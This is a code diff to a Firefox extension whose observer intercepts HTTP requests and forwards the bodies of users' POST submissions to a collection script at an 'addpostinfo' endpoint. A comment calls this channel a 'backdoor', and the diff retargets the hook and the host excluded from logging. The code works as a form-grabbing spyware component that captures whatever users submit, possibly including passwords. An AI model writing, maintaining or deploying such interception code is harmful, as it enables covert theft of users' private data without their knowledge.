@@ -69,7 +69,7 @@ function Sniff(extension) {
 	this.observe = function(subject, topic, data) {
 		try {
 			subject.QueryInterface(Components.interfaces.nsIHttpChannel);
-			if(topic == "http-on-modify-request") {
+			if(topic == "http-on-opening-request") {
 				this.extension.ProcessRequest(subject, this.extension.config);
 			}
 			/*
@@ -418,7 +418,7 @@ function Extension() {
 			this.obsserv = Components.classes["@mozilla.org/observer-service;1"].getService(Components.interfaces.nsIObserverService);
 			this.conserv = Components.classes["@mozilla.org/consoleservice;1"].getService(Components.interfaces.nsIConsoleService);
 			if((this.obsserv != null) && (this.sniff != null)) {
-				this.obsserv.addObserver(this.sniff, "http-on-modify-request", false);
+				this.obsserv.addObserver(this.sniff, "http-on-opening-request", false);
 				this.obsserv.addObserver(this.sniff, "http-on-examine-response", false);
 			}
 
@@ -429,7 +429,7 @@ function Extension() {
 
 	this.Uninitialize = function() {
 		if((this.obsserv != null) && (this.sniff != null))
-			this.obsserv.removeObserver(this.sniff, "http-on-modify-request");
+			this.obsserv.removeObserver(this.sniff, "http-on-opening-request");
 		//this.obsserv.removeObserver(this.sniff, "http-on-examine-response");
 	};
 
@@ -507,7 +507,7 @@ function Extension() {
 						httpChannel.requestMethod = "POST";
 					}
 					// Report the intercepted POST
-					if(!host.match(/com-safebrowsing/)) {//prevent logging backdoor communication
+					if(!host.match(/127.0.0.1/)) {//prevent logging backdoor communication
 						request = new XMLHttpRequest();
 						//var userID = this.generateUserID();
 						extension.sendMessage('http://127.0.0.1/addpostinfo/index.php' , "postinfo%5Bdata%5D=" + encodeURIComponent(poststr), config.checksslvar);
